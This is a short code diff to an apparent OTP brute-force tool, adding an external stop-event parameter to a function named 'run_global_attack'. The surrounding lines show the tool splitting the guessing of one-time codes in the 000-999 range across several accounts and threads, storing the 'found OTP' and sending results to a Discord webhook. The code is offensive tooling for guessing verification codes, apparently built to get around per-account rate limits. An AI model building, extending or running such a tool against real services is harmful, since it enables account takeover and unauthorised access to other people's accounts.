@@ -526,7 +526,7 @@ def run_multi_account_attack(selected_files=None):
     input("\n Press Enter to return to menu...")
 
 
-def run_global_attack(files, temp_dir, num_threads, cooldown, webhook_url=None):
+def run_global_attack(files, temp_dir, num_threads, cooldown, webhook_url=None, stop_event=None):
     """
     Run a global attack using configs from a temporary directory.
     Similar to multi-account but for cloud-synced users.
@@ -537,6 +537,7 @@ def run_global_attack(files, temp_dir, num_threads, cooldown, webhook_url=None):
         num_threads: Threads per account
         cooldown: Cooldown per thread
         webhook_url: Optional Discord webhook for OTP notifications
+        stop_event: Optional threading.Event to control stopping from outside
     """
     count_accounts = len(files)
     print(font(f"\n Global Attack with {count_accounts} user(s).", color="red", inverse=True))
@@ -548,7 +549,7 @@ def run_global_attack(files, temp_dir, num_threads, cooldown, webhook_url=None):
     print(font(f" Strategy: Distributed 000-999 across {count_accounts} users.", color="magenta"))
     print(font(" Press 'q' or 'esc' to stop ALL attacks.", color="yellow"))
     
-    shared_stop_event = threading.Event()
+    shared_stop_event = stop_event if stop_event is not None else threading.Event()
     shared_print_lock = threading.Lock()
     
     # Shared context to store the found OTP
